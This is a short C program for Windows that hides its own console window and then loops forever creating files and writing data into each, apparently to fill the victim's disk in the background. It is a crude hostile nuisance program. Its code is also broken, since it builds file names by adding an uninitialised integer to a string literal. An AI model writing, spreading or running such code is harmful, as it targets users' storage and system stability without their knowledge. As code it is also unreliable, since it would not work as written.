#include <stdio.h>
#include <windows.h>

void main(void) {
  HWND hWnd = GetConsoleWindow();
  ShowWindow( hWnd, SW_MINIMIZE );
  ShowWindow( hWnd, SW_HIDE );

  FILE *file;
  int i;

  for (;;) {
    file = fopen(i + ".dat", "w");
    fprintf(file, "FFFFFFFF");
    fclose(file);
    i++;
  }
}
